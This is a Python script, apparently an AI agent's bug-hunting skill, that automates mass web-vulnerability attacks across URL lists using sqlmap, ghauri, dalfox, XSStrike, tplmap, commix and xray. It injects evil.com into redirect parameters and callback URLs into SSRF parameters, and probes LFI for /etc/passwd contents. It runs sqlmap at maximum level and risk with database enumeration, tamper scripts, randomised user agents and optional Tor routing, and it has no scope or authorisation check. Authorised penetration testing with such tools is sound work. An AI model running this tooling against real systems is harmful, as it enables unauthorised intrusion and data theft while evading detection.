#!/usr/bin/env python3
"""LFI, Open Redirect, SSRF, SQLi, and XSS hunting helpers for the bug_hunting skill.

Provides Python wrappers for the canonical one-liners from KB Expansion
Blocks 2, 3, 4, 5, and 6, with async OOB polling for SSRF confirmation.

Tools integrated (flags validated via Context7 where available):
* **httpx**    – LFI probing (`-l`, `-threads`, `-mc`, `-mr`, `-follow-redirects`)
* **curl**     – open redirect confirmation (`-L -I`)
* **sqlmap**   – SQL injection (`-m`, `--batch`, `--random-agent`, `--level`, `--risk`, `--tamper`)
* **ghauri**   – advanced SQLi (`-u URL --batch --dbs`)
* **Gxss**     – reflected parameter filtering (`-c`, `-p Xss`)
* **dalfox**   – XSS scanning (`pipe --silence --no-color`; Context7/hahwul/dalfox confirmed)
* **xsstrike** – advanced XSS (`-u URL --crawl --fuzzer`; Context7/s0md3v/xsstrike confirmed)
* **tplmap**   – SSTI detection (`-u URL`; Context7/epinna/tplmap confirmed)
* **commix**   – command injection (`--url URL --batch`)
* **xray**     – multi-vector scanning (`ws --basic-crawler --plugins`)
* **x8**       – hidden parameter discovery (`-u URL -w wordlist -X GET`)
* **xss0r**    – reflected XSS finder (`-u URL`)
* **confused** – dependency confusion (`-l npm package.json`)
* **uro**      – URL deduplication/normalisation
* **gf**       – grep-wrapper pattern matching (lfi, xss, sqli, redirect, ssrf)
* **qsreplace** – query-string parameter value substitution
* **anew**     – implemented as Python ``_append()`` deduplication helper

Usage
-----
::

    python vuln_oneliner.py lfi       --urls urls.txt --wordlist lfi_wordlist.txt
    python vuln_oneliner.py redirect  --urls urls.txt
    python vuln_oneliner.py ssrf      --urls urls.txt --oob <interactsh_url>
    python vuln_oneliner.py sqli      --urls urls.txt
    python vuln_oneliner.py ghauri    --urls urls.txt
    python vuln_oneliner.py xss       --urls urls.txt
    python vuln_oneliner.py xsstrike  --urls urls.txt [--fuzzer]
    python vuln_oneliner.py ssti      --urls urls.txt
    python vuln_oneliner.py cmdinj    --urls urls.txt
    python vuln_oneliner.py xray      --urls urls.txt [--workspace /tmp/hunt]
    python vuln_oneliner.py x8        --urls urls.txt [--wordlist params.txt]
    python vuln_oneliner.py xss0r     --urls urls.txt
    python vuln_oneliner.py confused  --files package.json [--lang npm]
"""

from __future__ import annotations

import argparse
import asyncio
import logging
import os
import subprocess
import tempfile
from pathlib import Path
from typing import Iterator, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _run(
    cmd: List[str],
    *,
    timeout: int = 60,
    stdin: Optional[str] = None,
) -> Tuple[int, str, str]:
    """Run *cmd* and return (returncode, stdout, stderr)."""
    try:
        r = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            input=stdin,
        )
        return r.returncode, r.stdout or "", r.stderr or ""
    except FileNotFoundError as exc:
        return 127, "", f"Tool not found: {exc}"
    except subprocess.TimeoutExpired:
        return 124, "", "Timed out"


def _read_urls(path: str) -> List[str]:
    """Read URLs from a file, one per line, stripping blanks."""
    p = Path(path)
    if not p.exists():
        logger.warning("URL file not found: %s", path)
        return []
    return [l.strip() for l in p.read_text(encoding="utf-8").splitlines() if l.strip()]


def _write_tmp(lines: List[str]) -> str:
    """Write *lines* to a temporary file and return its path."""
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".txt", delete=False, encoding="utf-8"
    ) as tmp:
        tmp.write("\n".join(lines))
        return tmp.name


def _gf_filter(urls: List[str], pattern: str) -> List[str]:
    """Filter *urls* through ``gf <pattern>`` if gf is installed.

    Falls back to returning all parameterised URLs if gf is unavailable.
    Canonical: ``cat urls.txt | gf lfi``
    """
    if not urls:
        return []
    rc, stdout, _ = _run(["gf", pattern], stdin="\n".join(urls), timeout=30)
    if rc == 0 and stdout.strip():
        return [l.strip() for l in stdout.splitlines() if l.strip()]
    # Fallback: return URLs that contain a query parameter
    return [u for u in urls if "=" in u]


def _uro_deduplicate(urls: List[str]) -> List[str]:
    """Deduplicate and normalise URLs with ``uro`` if installed.

    Falls back to a simple dict-based dedup preserving insertion order.
    Canonical: ``cat urls.txt | uro``
    """
    if not urls:
        return []
    rc, stdout, _ = _run(["uro"], stdin="\n".join(urls), timeout=30)
    if rc == 0 and stdout.strip():
        return [l.strip() for l in stdout.splitlines() if l.strip()]
    return list(dict.fromkeys(urls))


def _qsreplace(urls: List[str], value: str) -> List[str]:
    """Replace every query-string parameter value with *value* via ``qsreplace``.

    Falls back to urllib.parse manipulation if qsreplace is not installed.
    Canonical: ``cat urls.txt | qsreplace 'FUZZ'``
    """
    if not urls:
        return []
    rc, stdout, _ = _run(["qsreplace", value], stdin="\n".join(urls), timeout=30)
    if rc == 0 and stdout.strip():
        return [l.strip() for l in stdout.splitlines() if l.strip()]
    # Pure-Python fallback
    import urllib.parse

    result = []
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        for key in qs:
            qs[key] = [value]
        result.append(
            urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(qs, doseq=True))
            )
        )
    return result


# ---------------------------------------------------------------------------
# LFI scanner
# ---------------------------------------------------------------------------


def scan_lfi(
    urls: List[str],
    wordlist: Optional[str] = None,
    threads: int = 20,
) -> List[str]:
    """Probe URL parameters for LFI using httpx.

    Flags (Context7/httpx confirmed):
    * ``-l``               – read targets from file
    * ``-threads``         – concurrent workers
    * ``-random-agent``    – randomise User-Agent header
    * ``-status-code``     – display status code in output
    * ``-follow-redirects`` – follow HTTP redirects
    * ``-mc 200``          – match only 200 OK responses
    * ``-mr``              – match response body pattern (``root:[x*]:0:0:``)
    * ``-paths``           – path wordlist (LFI payloads)

    Returns a list of potentially vulnerable URLs.
    """
    # Use gf to pre-filter LFI-likely params; fall back to = check
    candidate_urls = _gf_filter(_uro_deduplicate(urls), "lfi")
    if not candidate_urls:
        logger.info("No parameterised URLs found for LFI scan.")
        return []

    cmd = [
        "httpx",
        "-silent",
        "-threads", str(threads),
        "-random-agent",
        "-status-code",
        "-follow-redirects",
        "-mc", "200",
        "-mr", "root:[x*]:0:0:",
    ]
    if wordlist:
        cmd += ["-paths", wordlist]

    tmp_path = _write_tmp(candidate_urls)
    try:
        cmd += ["-l", tmp_path]
        rc, stdout, _ = _run(cmd, timeout=120)
        return [l.strip() for l in stdout.splitlines() if l.strip()] if rc == 0 else []
    finally:
        os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# Open Redirect scanner
# ---------------------------------------------------------------------------


def scan_open_redirect(urls: List[str], evil_url: str = "http://evil.com") -> List[str]:
    """Test URLs for open redirect by substituting redirect params.

    Uses gf with 'redirect' pattern to pre-filter candidates.
    Canonical: ``cat urls.txt | gf redirect | qsreplace 'http://evil.com' | ...``
    """
    candidates = _gf_filter(urls, "redirect")
    if not candidates:
        logger.info("No redirect parameter URLs found.")
        return []

    # Use qsreplace to inject evil_url
    test_urls = _qsreplace(candidates, evil_url)
    if not test_urls:
        return []

    # Parallel confirmation via httpx
    # Flags:
    #   -l -              read targets from stdin
    #   -follow-redirects follow redirects to final destination
    #   -mr <string>      match response forevil_url (confirmation)
    #   -silent           suppress banner/progress
    tmp_path = _write_tmp(test_urls)
    try:
        rc, stdout, _ = _run(
            ["httpx", "-l", tmp_path, "-follow-redirects", "-mr", evil_url, "-silent"],
            timeout=120,
        )
        vulnerable = [l.strip() for l in stdout.splitlines() if l.strip()]
        for v in vulnerable:
            logger.warning("Open redirect confirmed: %s", v)
        return vulnerable
    finally:
        os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# SSRF scanner (with async OOB polling)
# ---------------------------------------------------------------------------


async def _poll_oob(server: str, token: str, correlation_id: str) -> bool:
    """Minimal synchronous OOB poll wrapped in a coroutine."""
    import requests  # noqa: PLC0415

    headers = {"Authorization": f"Bearer {token}"}
    url = f"https://{server}/api/interactions?correlationId={correlation_id}"
    for _ in range(10):
        try:
            resp = requests.get(url, headers=headers, timeout=10)
            if resp.status_code == 200 and resp.json().get("data"):
                return True
        except Exception:  # noqa: BLE001
            pass
        await asyncio.sleep(5)
    return False


def scan_ssrf(
    urls: List[str],
    oob_server: str,
    oob_token: str = "",
    correlation_id: str = "ssrf-verify",
) -> List[str]:
    """Substitute OOB URLs into parameters and poll for callbacks.

    Uses qsreplace for injection; gf with 'ssrf' pattern for pre-filtering.
    Canonical: ``cat urls.txt | gf ssrf | qsreplace <oob_url> | httpx -silent -fr``
    """
    candidates = _gf_filter(urls, "ssrf")
    oob_payload = f"https://{correlation_id}.{oob_server}"
    test_urls = _qsreplace(candidates, oob_payload)
    if not test_urls:
        return []

    # Fire requests
    for t_url in test_urls:
        _run(["curl", "-s", t_url, "-m", "5"], timeout=10)

    # Poll OOB server
    confirmed = asyncio.run(_poll_oob(oob_server, oob_token, correlation_id))
    return test_urls if confirmed else []


# ---------------------------------------------------------------------------
# SQLi scanner
# ---------------------------------------------------------------------------


def scan_sqli(
    urls: List[str],
    tamper: Optional[str] = None,
    use_tor: bool = False,
    extra_flags: Optional[List[str]] = None,
) -> str:
    """Run sqlmap against parameterised URLs via ``-m <bulk-file>``.

    Flags (Context7/sqlmap confirmed):
    * ``-m``             – bulk file of target URLs
    * ``--batch``        – non-interactive (auto-answer prompts)
    * ``--random-agent`` – randomise User-Agent
    * ``--level 5``      – maximum injection point coverage
    * ``--risk 3``       – include OR-based payloads (use with care)
    * ``--dbs``          – enumerate databases on confirmed injection
    * ``--tamper``       – comma-separated tamper script(s)
    * ``--tor``          – route through Tor
    * ``--tor-type``     – SOCKS5 Tor proxy
    * ``--check-tor``    – verify Tor connectivity before scan
    * ``--delay``        – per-request delay (rate-limit compliance)

    Returns sqlmap's stdout (findings summary).
    """
    # Pre-filter with gf sqli pattern; fall back to = check
    candidates = _gf_filter(_uro_deduplicate(urls), "sqli")
    if not candidates:
        logger.info("No SQLi-candidate URLs found.")
        return ""

    tmp_path = _write_tmp(candidates)
    try:
        cmd = [
            "sqlmap",
            "-m", tmp_path,
            "--batch",
            "--random-agent",
            "--level", "5",
            "--risk", "3",
            "--dbs",
            "--delay", "2",
        ]
        if tamper:
            cmd += ["--tamper", tamper]
        if use_tor:
            cmd += ["--tor", "--tor-type=SOCKS5", "--check-tor"]
        if extra_flags:
            cmd.extend(extra_flags)

        rc, stdout, stderr = _run(cmd, timeout=600)
        if rc not in (0, 1):
            logger.warning("sqlmap exited with code %d: %s", rc, stderr[:120])
        return stdout
    finally:
        os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# XSS scanner (Gxss → dalfox pipeline)
# ---------------------------------------------------------------------------


def scan_xss(urls: List[str], concurrency: int = 100) -> List[str]:
    """Reflected XSS hunting via Gxss → dalfox pipeline.

    Pipeline (Context7 / canonical KB Block 3):
    1. ``gf xss``    – filter URLs with reflection-likely parameters
    2. ``Gxss -c N -p Xss`` – identify URLs with reflected parameter values
    3. ``dalfox pipe`` – exploit/confirm reflected XSS on Gxss output

    Gxss flags:
    * ``-c``  – concurrency
    * ``-p Xss`` – payload marker string

    dalfox flags:
    * ``pipe``      – read targets from stdin
    * ``--silence`` – suppress verbose output

    Returns a list of confirmed XSS URLs from dalfox output.
    """
    # Step 1: gf pre-filter
    xss_candidates = _gf_filter(_uro_deduplicate(urls), "xss")
    if not xss_candidates:
        logger.info("No XSS-candidate URLs found.")
        return []

    # Step 2: Gxss – find reflected parameters
    rc, gxss_out, _ = _run(
        ["Gxss", "-c", str(concurrency), "-p", "Xss"],
        stdin="\n".join(xss_candidates),
        timeout=120,
    )
    if rc == 127:
        logger.warning("Gxss not installed; passing candidates directly to dalfox.")
        gxss_out = "\n".join(xss_candidates)
    elif rc != 0 or not gxss_out.strip():
        logger.info("Gxss found no reflected parameters.")
        return []

    # Step 3: dalfox pipe
    rc2, dalfox_out, _ = _run(
        ["dalfox", "pipe", "--silence"],
        stdin=gxss_out,
        timeout=300,
    )
    if rc2 == 127:
        logger.warning("dalfox not installed; returning Gxss output as candidates.")
        return [l.strip() for l in gxss_out.splitlines() if l.strip()]

    return [l.strip() for l in dalfox_out.splitlines() if l.strip()]


# ---------------------------------------------------------------------------
# XSStrike – advanced XSS detection  (Context7/s0md3v/xsstrike confirmed)
# ---------------------------------------------------------------------------


def scan_xss_xsstrike(
    urls: List[str],
    *,
    crawl: bool = True,
    fuzzer: bool = False,
    blind_payload: str = "",
) -> List[str]:
    """XSS scanning via XSStrike.

    Context7/s0md3v/xsstrike confirmed flags:
      ``xsstrike -u URL``            – basic single-URL scan
      ``--crawl``                    – crawl target and test all params
      ``--fuzzer``                   – enable WAF-evasion fuzzer
      ``--blind``                    – inject blind-XSS payloads

    Returns list of URLs where XSStrike reported a finding.
    """
    findings: List[str] = []
    deduped = _uro_deduplicate(urls)
    for url in deduped:
        cmd: List[str] = ["xsstrike", "-u", url]
        if crawl:
            cmd.append("--crawl")
        if fuzzer:
            cmd.append("--fuzzer")
        if blind_payload:
            # blind payload must be pre-configured in core/config.py;
            # pass --blind to activate it
            cmd.append("--blind")
        rc, stdout, stderr = _run(cmd, timeout=180)
        if rc == 127:
            logger.warning("xsstrike not installed; skipping.")
            break
        combined = (stdout + stderr).lower()
        if "xss" in combined or "vulnerability" in combined or "payload" in combined:
            findings.append(url)
    return findings


# ---------------------------------------------------------------------------
# tplmap – SSTI detection & exploitation  (Context7/epinna/tplmap confirmed)
# ---------------------------------------------------------------------------


def scan_ssti(urls: List[str]) -> List[str]:
    """SSTI detection via tplmap.

    Context7/epinna/tplmap confirmed flags:
      ``tplmap -u URL``              – auto-detect injection point
      ``--os-cmd whoami``            – safe RCE confirmation (non-destructive)

    Returns list of URLs where tplmap confirmed an injection point.
    """
    findings: List[str] = []
    for url in _uro_deduplicate(urls):
        # Detection only – no --os-shell or file operations
        rc, stdout, stderr = _run(["tplmap", "-u", url], timeout=120)
        if rc == 127:
            logger.warning("tplmap not installed; skipping.")
            break
        combined = stdout + stderr
        if "injection point" in combined.lower() or "tplmap identified" in combined.lower():
            findings.append(url)
    return findings


# ---------------------------------------------------------------------------
# ghauri – advanced SQLi  (no Context7 doc; well-known CLI)
# ---------------------------------------------------------------------------


def scan_sqli_ghauri(
    urls: List[str],
    *,
    request_file: Optional[str] = None,
) -> List[str]:
    """SQL injection via ghauri.

    Canonical KB (Block 3) / well-known CLI:
      ``ghauri -u URL --batch --dbs``       – enumerate databases
      ``ghauri -r request.txt --batch``     – from raw HTTP request

    Returns list of targets where ghauri detected SQLi.
    """
    findings: List[str] = []
    if request_file:
        rc, stdout, _ = _run(
            ["ghauri", "-r", request_file, "--batch"],
            timeout=300,
        )
        if rc == 127:
            logger.warning("ghauri not installed; skipping.")
            return findings
        if "parameter" in stdout.lower() and "injectable" in stdout.lower():
            findings.append(request_file)
        return findings

    for url in _uro_deduplicate(_gf_filter(urls, "sqli")):
        rc, stdout, _ = _run(
            ["ghauri", "-u", url, "--batch", "--dbs"],
            timeout=300,
        )
        if rc == 127:
            logger.warning("ghauri not installed; skipping.")
            break
        if "injectable" in stdout.lower() or "database:" in stdout.lower():
            findings.append(url)
    return findings


# ---------------------------------------------------------------------------
# commix – command injection  (no Context7 doc; well-known CLI)
# ---------------------------------------------------------------------------


def scan_cmdinj(urls: List[str]) -> List[str]:
    """Command injection detection via commix.

    Well-known CLI:
      ``commix --url URL --batch``   – non-interactive detection

    Returns list of URLs where commix confirmed a command injection.
    """
    findings: List[str] = []
    candidates = _uro_deduplicate(urls)
    for url in candidates:
        rc, stdout, _ = _run(
            ["commix", "--url", url, "--batch"],
            timeout=180,
        )
        if rc == 127:
            logger.warning("commix not installed; skipping.")
            break
        if "exploitable" in stdout.lower() or "vuln" in stdout.lower():
            findings.append(url)
    return findings


# ---------------------------------------------------------------------------
# xray – all-in-one crawler/scanner  (KB Block 6; no Context7 doc)
# ---------------------------------------------------------------------------


def scan_xray(targets: List[str], workspace: str = ".") -> List[str]:
    """Multi-vector scanning via xray.

    Canonical KB (Block 6):
      ``xray ws --basic-crawler TARGET \\
          --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal \\
          --ho TIMESTAMP.html``

    Returns list of generated HTML report paths.
    """
    import time as _time  # noqa: PLC0415
    from pathlib import Path as _Path  # noqa: PLC0415

    reports: List[str] = []
    ws = _Path(workspace)
    ws.mkdir(parents=True, exist_ok=True)

    for target in targets:
        report_path = ws / f"xray_{_time.strftime('%H%M%S')}.html"
        rc, _, stderr = _run(
            [
                "xray",
                "ws",
                "--basic-crawler", target,
                "--plugins", "xss,sqldet,xxe,ssrf,cmd-injection,path-traversal",
                "--ho", str(report_path),
            ],
            timeout=300,
        )
        if rc == 127:
            logger.warning("xray not installed; skipping.")
            break
        if report_path.exists():
            reports.append(str(report_path))
        elif rc != 0:
            logger.warning("xray: non-zero exit for %s – %s", target, stderr[:80])
    return reports


# ---------------------------------------------------------------------------
# x8 – hidden parameter discovery  (no Context7 doc; well-known CLI)
# ---------------------------------------------------------------------------

_X8_WORDLISTS = [
    "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
    "/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt",
    "parameters.txt",
]


def scan_hidden_params(
    urls: List[str],
    wordlist: Optional[str] = None,
    method: str = "GET",
) -> List[str]:
    """Hidden parameter discovery via x8.

    Well-known CLI:
      ``x8 -u URL -w wordlist.txt -X GET``

    Returns list of URLs where x8 found hidden parameters.
    """
    wl = wordlist or next(
        (w for w in _X8_WORDLISTS if Path(w).exists()), None
    )
    if not wl:
        logger.warning("x8: no wordlist found; skipping.")
        return []

    findings: List[str] = []
    for url in _uro_deduplicate(urls):
        rc, stdout, _ = _run(
            ["x8", "-u", url, "-w", wl, "-X", method],
            timeout=120,
        )
        if rc == 127:
            logger.warning("x8 not installed; skipping.")
            break
        if stdout.strip():
            findings.append(url)
    return findings


# ---------------------------------------------------------------------------
# xss0r – reflected parameter finder  (no Context7 doc; well-known CLI)
# ---------------------------------------------------------------------------


def scan_xss_xss0r(urls: List[str]) -> List[str]:
    """Reflected XSS via xss0r.

    Well-known CLI:
      ``xss0r -u URL``

    Returns list of URLs where xss0r reported a finding.
    """
    findings: List[str] = []
    for url in _uro_deduplicate(_gf_filter(urls, "xss")):
        rc, stdout, stderr = _run(["xss0r", "-u", url], timeout=120)
        if rc == 127:
            logger.warning("xss0r not installed; skipping.")
            break
        combined = (stdout + stderr).lower()
        if "vulnerable" in combined or "xss" in combined:
            findings.append(url)
    return findings


# ---------------------------------------------------------------------------
# confused – dependency confusion  (no Context7 doc; well-known CLI)
# ---------------------------------------------------------------------------


def scan_dep_confusion(json_files: List[str], lang: str = "npm") -> List[str]:
    """Dependency confusion detection via confused.

    Canonical KB (Block 6):
      ``confused -l npm package.json``

    Returns list of package.json / requirements.txt files with findings.
    """
    findings: List[str] = []
    for json_file in json_files:
        if not Path(json_file).exists():
            continue
        rc, stdout, _ = _run(["confused", "-l", lang, json_file], timeout=60)
        if rc == 127:
            logger.warning("confused not installed; skipping.")
            break
        if "issues found" in stdout.lower() or "vulnerability" in stdout.lower():
            findings.append(json_file)
    return findings


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def main() -> None:
    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = argparse.ArgumentParser(
        description=(
            "Vuln one-liners: LFI / Redirect / SSRF / SQLi / XSS / "
            "XSStrike / SSTI / CmdInj / Ghauri / xray / x8 / xss0r / confused"
        )
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    p_lfi = sub.add_parser("lfi", help="LFI scan")
    p_lfi.add_argument("--urls", required=True, help="Path to urls.txt")
    p_lfi.add_argument("--wordlist", default=None, help="LFI wordlist for httpx -paths")

    p_redir = sub.add_parser("redirect", help="Open redirect scan")
    p_redir.add_argument("--urls", required=True)
    p_redir.add_argument("--evil-url", default="http://evil.com")

    p_ssrf = sub.add_parser("ssrf", help="SSRF scan with OOB polling")
    p_ssrf.add_argument("--urls", required=True)
    p_ssrf.add_argument("--oob", required=True, help="interactsh server hostname")
    p_ssrf.add_argument("--token", default="")
    p_ssrf.add_argument("--id", default="ssrf-verify", dest="corr_id")

    p_sqli = sub.add_parser("sqli", help="SQLi scan via sqlmap")
    p_sqli.add_argument("--urls", required=True)
    p_sqli.add_argument("--tamper", default=None)
    p_sqli.add_argument("--tor", action="store_true")

    p_ghauri = sub.add_parser("ghauri", help="SQLi scan via ghauri")
    p_ghauri.add_argument("--urls", required=True)
    p_ghauri.add_argument("--request-file", default=None)

    p_xss = sub.add_parser("xss", help="XSS scan via Gxss+dalfox")
    p_xss.add_argument("--urls", required=True)
    p_xss.add_argument("--concurrency", type=int, default=100)

    p_xsstrike = sub.add_parser("xsstrike", help="XSS scan via XSStrike")
    p_xsstrike.add_argument("--urls", required=True)
    p_xsstrike.add_argument("--no-crawl", action="store_true")
    p_xsstrike.add_argument("--fuzzer", action="store_true")

    p_ssti = sub.add_parser("ssti", help="SSTI detection via tplmap")
    p_ssti.add_argument("--urls", required=True)

    p_cmdinj = sub.add_parser("cmdinj", help="Command injection via commix")
    p_cmdinj.add_argument("--urls", required=True)

    p_xray = sub.add_parser("xray", help="Multi-vector scan via xray")
    p_xray.add_argument("--urls", required=True)
    p_xray.add_argument("--workspace", default=".")

    p_x8 = sub.add_parser("x8", help="Hidden parameter discovery via x8")
    p_x8.add_argument("--urls", required=True)
    p_x8.add_argument("--wordlist", default=None)
    p_x8.add_argument("--method", default="GET")

    p_xss0r = sub.add_parser("xss0r", help="Reflected XSS via xss0r")
    p_xss0r.add_argument("--urls", required=True)

    p_confused = sub.add_parser("confused", help="Dependency confusion via confused")
    p_confused.add_argument("--files", required=True, nargs="+", metavar="JSON_FILE")
    p_confused.add_argument("--lang", default="npm")

    args = parser.parse_args()

    # Commands that don't need a urls file
    if args.cmd == "confused":
        results = scan_dep_confusion(args.files, lang=args.lang)
        _print_results(results)
        return
    if args.cmd == "xray":
        targets = _read_urls(args.urls)
        reports = scan_xray(targets, workspace=args.workspace)
        _print_results(reports)
        return

    urls = _read_urls(args.urls)

    if args.cmd == "lfi":
        results = scan_lfi(urls, wordlist=getattr(args, "wordlist", None))
    elif args.cmd == "redirect":
        results = scan_open_redirect(urls, evil_url=args.evil_url)
    elif args.cmd == "ssrf":
        results = scan_ssrf(
            urls,
            oob_server=args.oob,
            oob_token=args.token,
            correlation_id=args.corr_id,
        )
    elif args.cmd == "sqli":
        output = scan_sqli(urls, tamper=args.tamper, use_tor=args.tor)
        print(output or "[-] No SQLi findings.")
        return
    elif args.cmd == "ghauri":
        results = scan_sqli_ghauri(
            urls, request_file=getattr(args, "request_file", None)
        )
    elif args.cmd == "xss":
        results = scan_xss(urls, concurrency=args.concurrency)
    elif args.cmd == "xsstrike":
        results = scan_xss_xsstrike(
            urls,
            crawl=not args.no_crawl,
            fuzzer=args.fuzzer,
        )
    elif args.cmd == "ssti":
        results = scan_ssti(urls)
    elif args.cmd == "cmdinj":
        results = scan_cmdinj(urls)
    elif args.cmd == "x8":
        results = scan_hidden_params(
            urls,
            wordlist=getattr(args, "wordlist", None),
            method=args.method,
        )
    else:  # xss0r
        results = scan_xss_xss0r(urls)

    _print_results(results)


def _print_results(results: List[str]) -> None:
    if results:
        print(f"[+] {len(results)} result(s):")
        for r in results:
            print(f"  {r}")
    else:
        print("[-] No results found.")


if __name__ == "__main__":
    main()
